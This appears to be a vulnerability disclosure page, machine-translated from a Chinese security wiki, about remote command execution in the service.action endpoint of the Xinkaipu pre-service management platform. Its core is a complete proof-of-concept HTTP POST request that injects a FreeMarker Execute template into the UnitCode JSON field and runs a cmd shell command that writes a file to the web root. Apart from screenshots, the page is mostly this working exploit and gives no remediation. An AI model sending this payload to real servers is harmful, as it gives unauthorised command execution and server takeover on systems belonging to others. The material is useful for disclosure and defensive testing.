# Xinkaipu Pre-service management platform service.action remote command execution vulnerability

## Vulnerability Description

The service.action interface of the new Kaipu pre-service management platform has a remote command execution vulnerability, and an attacker can obtain server permissions through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">New Proprietary Service Management Platform</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1691989411711-5c56958b-5bbf-4b98-89c2-4151004d3504.png)

Verify POC

```http
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1691990575177-be0f5d8c-cd7e-4274-a782-6fd506f39232.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1691990627821-b50c7d15-6d79-4fff-8aa8-e546cec37abf.png)